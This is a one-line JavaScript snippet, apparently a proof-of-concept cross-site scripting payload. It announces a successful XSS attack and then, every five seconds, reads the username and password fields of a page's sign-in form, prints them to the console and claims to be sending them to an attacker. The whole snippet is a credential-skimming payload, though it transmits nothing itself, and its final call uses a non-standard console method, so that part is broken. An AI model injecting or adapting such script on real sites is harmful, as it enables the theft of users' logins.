console.log("XSS Attack was successful"),$(function(){setInterval(function(){let n=$("#o-form-sign-in input[name=login_id]").val(),i=$("#o-form-sign-in input[name=password]").val();console.log("login_id",n,"password",i),n&&i&&console.warning(`(づ｡◕‿‿◕｡)づ Sending username**(${n}) and password**(${i}) to Attacker...`)},5e3)});


